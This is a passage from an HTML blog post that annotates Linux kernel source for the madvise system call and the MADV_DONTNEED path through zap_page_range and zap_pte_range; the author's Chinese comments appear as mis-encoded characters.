THP.</span><br><span class="hljs-comment"> *  MADV_DONTDUMP - the application wants to prevent pages in the given range</span><br><span class="hljs-comment"> *		from being included in its core dump.</span><br><span class="hljs-comment"> *  MADV_DODUMP - cancel MADV_DONTDUMP: no longer exclude from core dump.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * return values:</span><br><span class="hljs-comment"> *  zero    - success</span><br><span class="hljs-comment"> *  -EINVAL - start + len &lt; 0, start is not page-aligned,</span><br><span class="hljs-comment"> *		&quot;behavior&quot; is not a valid value, or application</span><br><span class="hljs-comment"> *		is attempting to release locked or shared pages.</span><br><span class="hljs-comment"> *  -ENOMEM - addresses in the specified range are not currently</span><br><span class="hljs-comment"> *		mapped, or are outside the AS of the process.</span><br><span class="hljs-comment"> *  -EIO    - an I/O error occurred while paging in data.</span><br><span class="hljs-comment"> *  -EBADF  - map exists, but area maps something that isn&#x27;t a file.</span><br><span class="hljs-comment"> *  -EAGAIN - a kernel resource was temporarily unavailable.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	ËøõÁ®ãÂèØ‰ª•‰ΩøÁî®madvise()Êù•Âª∫ËÆÆÂÜÖÊ†∏ÊÄé‰πàÂ§ÑÁêÜÁõ∏ÂÖ≥ÂÜÖÂ≠òÂå∫Âüü</span><br><span class="hljs-comment">	@start: ÂÜÖÂ≠òËµ∑ÂßãÂú∞ÂùÄ</span><br><span class="hljs-comment">	@len_in: ÈïøÂ∫¶</span><br><span class="hljs-comment">	@behavior: Âª∫ËÆÆ</span><br><span class="hljs-comment">*/</span><br>SYSCALL_DEFINE3(madvise, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, start, <span class="hljs-type">size_t</span>, len_in, <span class="hljs-type">int</span>, behavior)<br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, tmp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">prev</span>;</span><br>	<span class="hljs-type">int</span> unmapped_error = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> error = -EINVAL;<br>	<span class="hljs-type">int</span> write;<br>	<span class="hljs-type">size_t</span> len;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">blk_plug</span> <span class="hljs-title">plug</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span><br>	<span class="hljs-keyword">if</span> (behavior == MADV_HWPOISON || behavior == MADV_SOFT_OFFLINE)<br>		<span class="hljs-keyword">return</span> madvise_hwpoison(behavior, start, start+len_in);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//Ê£ÄÊü•‰∏Ä‰∏ãbehaviorÊòØÂê¶ÊúâÊïà</span><br>	<span class="hljs-keyword">if</span> (!madvise_behavior_valid(behavior))<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//Ë¶ÅÊ±ÇËµ∑ÂßãÂú∞ÂùÄ‰∏éÈ°µÂØπÈΩê</span><br>	<span class="hljs-keyword">if</span> (start &amp; ~PAGE_MASK)<br>		<span class="hljs-keyword">return</span> error;<br>    <span class="hljs-comment">//lenÂêë‰∏äÂÖ≥‰∫éÈ°µÂØπÈΩê</span><br>	len = (len_in + ~PAGE_MASK) &amp; PAGE_MASK;<br><br>	<span class="hljs-comment">/* Check to see whether len was rounded up from small -ve to zero */</span><br>    <span class="hljs-comment">//lenÊ∫¢Âá∫</span><br>	<span class="hljs-keyword">if</span> (len_in &amp;&amp; !len)<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//ÁªìÊùüÂú∞ÂùÄ</span><br>	end = start + len;<br>	<span class="hljs-keyword">if</span> (end &lt; start)<br>		<span class="hljs-keyword">return</span> error;<br><br>	error = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (end == start)<br>		<span class="hljs-keyword">return</span> error;<br>	<span class="hljs-comment">//Âà§Êñ≠‰∏ãËøô‰∏™Ë°å‰∏∫ÊòØÂê¶ÈúÄË¶ÅÂÜôÂÖ•mmapÔºåÂπ∂Ëé∑ÂèñÁõ∏ÂÖ≥‰ø°Âè∑Èáè</span><br>	write = madvise_need_mmap_write(behavior);<br>	<span class="hljs-keyword">if</span> (write) &#123;<br>		<span class="hljs-keyword">if</span> (down_write_killable(&amp;current-&gt;mm-&gt;mmap_sem))<br>			<span class="hljs-keyword">return</span> -EINTR;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		down_read(&amp;current-&gt;mm-&gt;mmap_sem);<br>	&#125;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If the interval [start,end) covers some unmapped address</span><br><span class="hljs-comment">	 * ranges, just ignore them, but return -ENOMEM at the end.</span><br><span class="hljs-comment">	 * - different from the way of handling in mlock etc.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//ÊâæÂà∞startÂØπÂ∫îÁöÑVMAÂØπË±°</span><br>	vma = find_vma_prev(current-&gt;mm, start, &amp;prev);<br>	<span class="hljs-keyword">if</span> (vma &amp;&amp; start &gt; vma-&gt;vm_start)<br>		prev = vma;<br><br>	blk_start_plug(&amp;plug);<br>	<span class="hljs-keyword">for</span> (;;) &#123;<span class="hljs-comment">//ÈÅçÂéÜÊâÄÊúâÁõ∏ÂÖ≥ÁöÑVMA</span><br>		<span class="hljs-comment">/* Still start &lt; end. */</span><br>		error = -ENOMEM;<br>		<span class="hljs-keyword">if</span> (!vma)<br>			<span class="hljs-keyword">goto</span> out;<br><br>		<span class="hljs-comment">/* Here start &lt; (end|vma-&gt;vm_end). */</span><br>		<span class="hljs-keyword">if</span> (start &lt; vma-&gt;vm_start) &#123;<br>			unmapped_error = -ENOMEM;<br>			start = vma-&gt;vm_start;<br>			<span class="hljs-keyword">if</span> (start &gt;= end)	<span class="hljs-comment">//startÊ≤°ÊúâÂØπÂ∫îÁöÑVMA</span><br>				<span class="hljs-keyword">goto</span> out;<br>		&#125;<br><br>		<span class="hljs-comment">/*tmp‰∏∫Êú¨Ê¨°Âª∫ËÆÆÁöÑÁªìÊùüÂú∞ÂùÄ Here vma-&gt;vm_start &lt;= start &lt; (end|vma-&gt;vm_end) */</span><br>        <br>		tmp = vma-&gt;vm_end;<br>		<span class="hljs-keyword">if</span> (end &lt; tmp)<br>			tmp = end;<br><br>		<span class="hljs-comment">/*ËøõË°åÂª∫ËÆÆ Here vma-&gt;vm_start &lt;= start &lt; tmp &lt;= (end|vma-&gt;vm_end). */</span><br>		error = madvise_vma(vma, &amp;prev, start, tmp, behavior);<br>		<span class="hljs-keyword">if</span> (error)<br>			<span class="hljs-keyword">goto</span> out;<br>		start = tmp;	<span class="hljs-comment">//‰∏ã‰∏ÄÊ¨°Âæ™ÁéØÁöÑËµ∑ÂßãÂú∞ÂùÄ</span><br>		<span class="hljs-keyword">if</span> (prev &amp;&amp; start &lt; prev-&gt;vm_end)<br>			start = prev-&gt;vm_end;<br>		error = unmapped_error;<br>		<span class="hljs-keyword">if</span> (start &gt;= end)	<span class="hljs-comment">//ÁªìÊùü</span><br>			<span class="hljs-keyword">goto</span> out;<br>        <span class="hljs-comment">//ÈáçÊñ∞ÂØªÊâæÂØπÂ∫îÁöÑVMA</span><br>		<span class="hljs-keyword">if</span> (prev)<br>			vma = prev-&gt;vm_next;<br>		<span class="hljs-keyword">else</span>	<span class="hljs-comment">/* madvise_remove dropped mmap_sem */</span><br>			vma = find_vma(current-&gt;mm, start);<br>	&#125;<br>out:<br>	blk_finish_plug(&amp;plug);<br>	<span class="hljs-keyword">if</span> (write)<br>		up_write(&amp;current-&gt;mm-&gt;mmap_sem);<br>	<span class="hljs-keyword">else</span><br>		up_read(&amp;current-&gt;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="madvise-vma"><a href="#madvise-vma" class="headerlink" title="madvise_vma()"></a>madvise_vma()</h4><p><code>madvice_vma()</code>Ê†πÊçÆ<code>behavior</code>ÊääËØ∑Ê±ÇÂàÜÈÖçÂà∞ÂØπÂ∫îÂ§ÑÁêÜÂáΩÊï∞, ÂØπ‰∫é<strong>MADV_DONTNEE</strong>D‰ºöË∞ÉÁî®<code>madvise_dontneed()</code>Â§ÑÁêÜ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">madvise_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, <span class="hljs-type">int</span> behavior)</span><br>&#123;<br>	<span class="hljs-keyword">switch</span> (behavior) &#123;<br>	<span class="hljs-keyword">case</span> MADV_REMOVE:<br>		<span class="hljs-keyword">return</span> madvise_remove(vma, prev, start, end);<br>	<span class="hljs-keyword">case</span> MADV_WILLNEED:<br>		<span class="hljs-keyword">return</span> madvise_willneed(vma, prev, start, end);<br>	<span class="hljs-keyword">case</span> MADV_FREE:<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * <span class="hljs-doctag">XXX:</span> In this implementation, MADV_FREE works like</span><br><span class="hljs-comment">		 * MADV_DONTNEED on swapless system or full swap.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (get_nr_swap_pages() &gt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">return</span> madvise_free(vma, prev, start, end);<br>		<span class="hljs-comment">/* passthrough */</span><br>	<span class="hljs-keyword">case</span> MADV_DONTNEED:<br>		<span class="hljs-keyword">return</span> madvise_dontneed(vma, prev, start, end);<br>	<span class="hljs-keyword">default</span>:<br>		<span class="hljs-keyword">return</span> madvise_behavior(vma, prev, start, end, behavior);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="madvise-dontneed"><a href="#madvise-dontneed" class="headerlink" title="madvise_dontneed()"></a>madvise_dontneed()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Application no longer needs these pages.  If the pages are dirty,</span><br><span class="hljs-comment"> * it&#x27;s OK to just throw them away.  The app will be more careful about</span><br><span class="hljs-comment"> * data it wants to keep.  Be sure to free swap resources too.  The</span><br><span class="hljs-comment"> * zap_page_range call sets things up for shrink_active_list to actually free</span><br><span class="hljs-comment"> * these pages later if no one else has touched them in the meantime,</span><br><span class="hljs-comment"> * although we could add these pages to a global reuse list for</span><br><span class="hljs-comment"> * shrink_active_list to pick up before reclaiming other pages.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NB: This interface discards data rather than pushes it out to swap,</span><br><span class="hljs-comment"> * as some implementations do.  This has performance implications for</span><br><span class="hljs-comment"> * applications like large transactional databases which want to discard</span><br><span class="hljs-comment"> * pages in anonymous maps after committing to backing store the data</span><br><span class="hljs-comment"> * that was kept in them.  There is no reason to write this data out to</span><br><span class="hljs-comment"> * the swap area if the application is discarding it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * An interface that causes the system to free clean pages and flush</span><br><span class="hljs-comment"> * dirty pages is already available as msync(MS_INVALIDATE).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	Â∫îÁî®Ë°®Á§∫‰∏çÈúÄË¶ÅËøô‰∫õÈ°µÔºåÂç≥‰ΩøËøô‰∫õÈ°µÊòØËÑèÈ°µÔºå‰πüÁõ¥Êé•‰∏¢ÂºÉÔºåÂõ†Ê≠§Â∫îÁî®Âú®‰∏¢ÂºÉÂâçÂøÖÈ°ªËá™Â∑±‰øùÂ≠òÂ•ΩÊï∞ÊçÆ</span><br><span class="hljs-comment">	-zap_page_range()‰ºöËÆæÁΩÆshrink_active_list‰∏∫ÂÆûÈôÖË¶ÅÈáäÊîæÁöÑÈ°µÔºåÂ¶ÇÊûú‰∏ÄÊÆµÊó∂Èó¥ÂêéÊ≤°ÊúâtouchËøô‰∫õÈ°µÔºåÈÇ£‰πàÂ∞±‰ºöË¢´ÈáäÊîæ*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">madvise_dontneed</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">			     <span class="hljs-keyword">struct</span> vm_area_struct **prev,</span><br><span class="hljs-params">			     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end)</span><br>&#123;<br>	*prev = vma;<br>    <span class="hljs-comment">//Ëøô‰∫õÈ°µÈù¢Êó†Ê≥ï‰∏¢ÂºÉ</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; (VM_LOCKED|VM_HUGETLB|VM_PFNMAP))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	zap_page_range(vma, start, end - start, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="zap-page-range"><a href="#zap-page-range" class="headerlink" title="zap_page_range()"></a>zap_page_range()</h4><p><code>zap_page_range()</code>‰ºöÈÅçÂéÜÁªôÂÆöËåÉÂõ¥ÂÜÖÊâÄÊúâÁöÑ<strong>VMA</strong>, ÂØπÊØè‰∏Ä‰∏™<strong>VMA</strong>Ë∞ÉÁî®<code>unmap_single_vma(...)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * zap_page_range - remove user pages in a given range</span><br><span class="hljs-comment"> * @vma: vm_area_struct holding the applicable pages</span><br><span class="hljs-comment"> * @start: starting address of pages to zap</span><br><span class="hljs-comment"> * @size: number of bytes to zap</span><br><span class="hljs-comment"> * @details: details of shared cache invalidation</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Caller must protect the VMA list</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">zap_page_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size, <span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_gather</span> <span class="hljs-title">tlb</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = start + size;<br><br>	lru_add_drain();<br>	tlb_gather_mmu(&amp;tlb, mm, start, end);<br>	update_hiwater_rss(mm);<br>	mmu_notifier_invalidate_range_start(mm, start, end);<br>    <span class="hljs-comment">//ÈÅçÂéÜ‰ªévmaÂºÄÂßãÔºåÂà∞endÁªìÊùüÁöÑÊâÄÊúâVMA</span><br>	<span class="hljs-keyword">for</span> ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end; vma = vma-&gt;vm_next)<br>		unmap_single_vma(&amp;tlb, vma, start, end, details);<br>	mmu_notifier_invalidate_range_end(mm, start, end);<br>	tlb_finish_mmu(&amp;tlb, start, end);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ÂêéÁª≠‰ºöÊ≤øÁùÄ<code>unmap_single_vma() =&gt; unmap_page_range() =&gt; zap_pud_range() =&gt; zap_pmd_range() =&gt; zap_pte_range()</code>ÁöÑË∑ØÂæÑÈÅçÂéÜÂêÑÁ∫ßÈ°µË°®È°π, ÊúÄÂêéË∞ÉÁî®<code>zap_pte_range()</code>ÈÅçÂéÜÊØè‰∏Ä‰∏™<strong>PTE</strong></p>
<h4 id="zap-pte-range"><a href="#zap-pte-range" class="headerlink" title="zap_pte_range()"></a>zap_pte_range()</h4><p><code>zap_pte_range()</code>‰ºöÈáäÊîæËåÉÂõ¥ÂÜÖÊâÄÊúâÁöÑÈ°µ</p>
<p>ÁÑ∂ÂêéÈÅçÂéÜËåÉÂõ¥ÂÜÖÊâÄÊúâÈ°µ, Ê∏ÖÁ©∫È°µË°®‰∏≠ÂØπÂ∫îÁöÑ<strong>PTE</strong>, Âπ∂ÂáèÂ∞ëÂØπÂ∫îÈ°µÁöÑÂºïÁî®ËÆ°Êï∞, ÂΩìÈ°µÁöÑÂºïÁî®ËÆ°Êï∞‰∏∫0Êó∂‰ºöË¢´ÂÜÖÊ†∏ÂõûÊî∂</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//ÈáäÊîæpteÂØπÂ∫îÁöÑÈ°µ</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">zap_pte_range</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb,</span><br><span class="hljs-params">				<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">pmd_t</span> *pmd,</span><br><span class="hljs-params">				<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end,</span><br><span class="hljs-params">				<span class="hljs-keyword">struct</span> zap_details *details)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> tlb-&gt;mm;<br>	<span class="hljs-type">int</span> force_flush = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> rss[NR_MM_COUNTERS];<br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *start_pte;<br>	<span class="hljs-type">pte_t</span> *pte;<br>	<span class="hljs-type">swp_entry_t</span> entry;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">pending_page</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>again:<br>	init_rss_vec(rss);<br>	start_pte = pte_offset_map_lock(mm, pmd, addr, &amp;ptl);<br>	pte = start_pte;<br>	arch_enter_lazy_mmu_mode();<br>    <span class="hljs-comment">//ÈÅçÂéÜ[addr, end)ËåÉÂõ¥ÁöÑÊØè‰∏Ä‰∏™È°µ</span><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-type">pte_t</span> ptent = *pte;<br>		<span class="hljs-keyword">if</span> (pte_none(ptent)) &#123;	<span class="hljs-comment">//Â¶ÇÊûúÈ°µÊèèËø∞ËåÉÂõ¥‰∏∫noneÂàô‰ªÄ‰πà‰πü‰∏çÁî®ÂÅö</span><br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (pte_present(ptent)) &#123;<span class="hljs-comment">//	Â¶ÇÊûúÈ°µÂ≠òÂú®</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>			page = vm_normal_page(vma, addr, ptent);	<span class="hljs-comment">//Ê†πÊçÆaddrÊâæÂà∞ÂØπÂ∫îÈ°µÊèèËø∞Á¨¶</span><br>			<span class="hljs-keyword">if</span> (unlikely(details) &amp;&amp; page) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * unmap_shared_mapping_pages() wants to</span><br><span class="hljs-comment">				 * invalidate cache without truncating:</span><br><span class="hljs-comment">				 * unmap shared but keep private pages.</span><br><span class="hljs-comment">				 */</span><br>				<span class="hljs-keyword">if</span> (details-&gt;check_mapping &amp;&amp;<br>				    details-&gt;check_mapping != page_rmapping(page))<br>					<span class="hljs-keyword">continue</span>;<br>			&#125;<br>			ptent = ptep_get_and_clear_full(mm, addr, pte,<br>							tlb-&gt;fullmm);	<span class="hljs-comment">//Ëé∑ÂèñÂéüÊù•ÁöÑPTEÂπ∂Ê∏ÖÁ©∫È°µË°®‰∏≠ÂØπÂ∫îÁöÑPTE</span><br>			tlb_remove_tlb_entry(tlb, pte, addr);<span class="hljs-comment">//Ê∏ÖÈô§TLB‰∏≠ÂØπÂ∫îÊù°ÁõÆ</span><br>			<span class="hljs-keyword">if</span> (unlikely(!page))<br>				<span class="hljs-keyword">continue</span>;<br><br>			<span class="hljs-keyword">if</span> (!PageAnon(page)) &#123;	<span class="hljs-comment">//Â¶ÇÊûúÊò†Â∞ÑÂà∞Êñá‰ª∂ÔºåËôΩÁÑ∂‰∏çÂõûÂÜôÊñá‰ª∂Ôºå‰ΩÜÊòØÈúÄË¶ÅË∞ÉÁî®Êñá‰ª∂Âú∞ÂùÄÁ©∫Èó¥Áõ∏ÂÖ≥ÂõûË∞ÉÂáΩÊï∞</span><br>				<span class="hljs-keyword">if</span> (pte_dirty(ptent)) &#123;		<span class="hljs-comment">//Â¶ÇÊûúÊó∂ËÑèÈ°µ</span><br>					<span class="hljs-comment">/*</span><br><span class="hljs-comment">					 * oom_reaper cannot tear down dirty</span><br><span class="hljs-comment">					 * pages</span><br><span class="hljs-comment">					 */</span><br>					<span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; details-&gt;ignore_dirty))<br>						<span class="hljs-keyword">continue</span>;<br>					force_flush = <span class="hljs-number">1</span>;<br>					set_page_dirty(page);	<span class="hljs-comment">//Ë∞ÉÁî®Êñá‰ª∂ÂØπÂ∫îÂú∞ÂùÄÁ©∫Èó¥‰∏≠ÁöÑ:	mapping-&gt;a_ops-&gt;set_page_dirty()ÊñπÊ≥ï</span><br>				&#125;<br>				<span class="hljs-keyword">if</span> (pte_young(ptent) &amp;&amp;<br>				    likely(!(vma-&gt;vm_flags &amp; VM_SEQ_READ)))<br>					mark_page_accessed(page);	<span class="hljs-comment">//Ê†áËÆ∞‰∏ãÈ°µÈù¢ÂàöÂàöËÆøÈóÆËøá</span><br>			&#125;<br>            <span class="hljs-comment">//ÁßªÂá∫ÂèçÂêëÊò†Â∞ÑÔºåÂπ∂ÂáèÂ∞ëpageÁöÑÂºïÁî®ËÆ°Êï∞</span><br>			rss[mm_counter(page)]--;<br>			page_remove_rmap(page, <span class="hljs-literal">false</span>);<br>			<span class="hljs-keyword">if</span> (unlikely(page_mapcount(page) &lt; <span class="hljs-number">0</span>))<br>				print_bad_pte(vma, addr, ptent, page);<br>			<span class="hljs-keyword">if</span> (unlikely(__tlb_remove_page(tlb, page))) &#123;	<span class="hljs-comment">//TLB‰∏≠ÁßªÂá∫ÂØπÂ∫îÈ°µ</span><br>				force_flush = <span class="hljs-number">1</span>;<br>				pending_page = page;<br>				addr += PAGE_SIZE;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<span class="hljs-keyword">continue</span>;	<span class="hljs-comment">//Â§ÑÁêÜ‰∏ã‰∏Ä‰∏™È°µ</span><br>		&#125;<br>		<span class="hljs-comment">/* only check swap_entries if explicitly asked for in details */</span><br>		<span class="hljs-keyword">if</span> (unlikely(details &amp;&amp; !details-&gt;check_swap_entries))<br>			<span class="hljs-keyword">continue</span>;<br><br>		entry = pte_to_swp_entry(ptent);<br>		<span class="hljs-keyword">if</span> (!non_swap_entry(entry))<br>			rss[MM_SWAPENTS]--;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_migration_entry(entry)) &#123;<br>			<span class="hljs-keyword">struct</span> page *page;<br><br>			page = migration_entry_to_page(entry);<br>			rss[mm_counter(page)]--;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (unlikely(!free_swap_and_cache(entry)))<br>			print_bad_pte(vma, addr, ptent, <span class="hljs-literal">NULL</span>);<br>		pte_clear_not_present_full(mm, addr, pte, tlb-&gt;fullmm);<br>	&#125; <span class="hljs-keyword">while</span> (pte++, addr += PAGE_SIZE, addr != end);<br><br>	add_mm_rss_vec(mm, rss);<br>	arch_leave_lazy_mmu_mode();<br><br>	<span class="hljs-comment">/* Do the actual TLB flush before dropping ptl */</span><br>	<span class="hljs-keyword">if</span> (force_flush)<br>		tlb_flush_mmu_tlbonly(tlb);<br>	pte_unmap_unlock(start_pte, ptl);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * If we forced a TLB flush (either due to running out of</span><br><span class="hljs-comment">	 * batch buffers or because we needed to flush dirty TLB</span><br><span class="hljs-comment">	 * entries before releasing the ptl), free the batched</span><br><span class="hljs-comment">	 * memory too. Restart if we didn&#x27;t do everything.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (force_flush) &#123;<br>		force_flush = <span class="hljs-number">0</span>;<br>		tlb_flush_mmu_free(tlb);<br>		<span class="hljs-keyword">if</span> (pending_page) 